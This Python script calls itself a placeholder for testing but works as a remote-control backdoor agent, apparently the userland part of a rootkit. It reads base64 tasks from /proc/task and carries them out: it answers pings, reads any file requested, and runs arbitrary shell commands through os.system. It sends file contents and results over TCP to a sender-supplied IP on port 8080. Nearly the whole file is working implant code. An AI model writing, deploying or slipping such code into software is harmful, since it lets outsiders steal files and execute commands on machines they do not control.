"""placeholder userland component for testing"""

import base64
import os
import socket
import time

RESPONSE_PORT = 8080


def send_response(ip, response):
    data = base64.b64encode(response)
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.connect((ip, RESPONSE_PORT))
    sock.send(data)
    sock.close()


def handle_ping(ip):
    send_response(ip, "PONG".encode("ascii"))


def handle_get(ip, path):
    with open(path, "rb") as f:
        data = f.read()
    send_response(ip, data)


def handle_exec(ip, cmd):
    code = os.system(cmd)
    send_response(ip, str(code).encode("ascii"))


def handle_task(task):
    src_ip, task = task.split(";")
    task = base64.b64decode(task).decode("ascii")
    if task == "PING":
        handle_ping(src_ip)
    if task.startswith("GET "):
        handle_get(src_ip, task[4:])
    if task.startswith("EXEC "):
        handle_exec(src_ip, task[4:])


def listen():
    with open("/proc/task", "r") as f:
        task = f.read()
        if task:
            print(task)
            handle_task(task)


if __name__ == "__main__":
    listen()

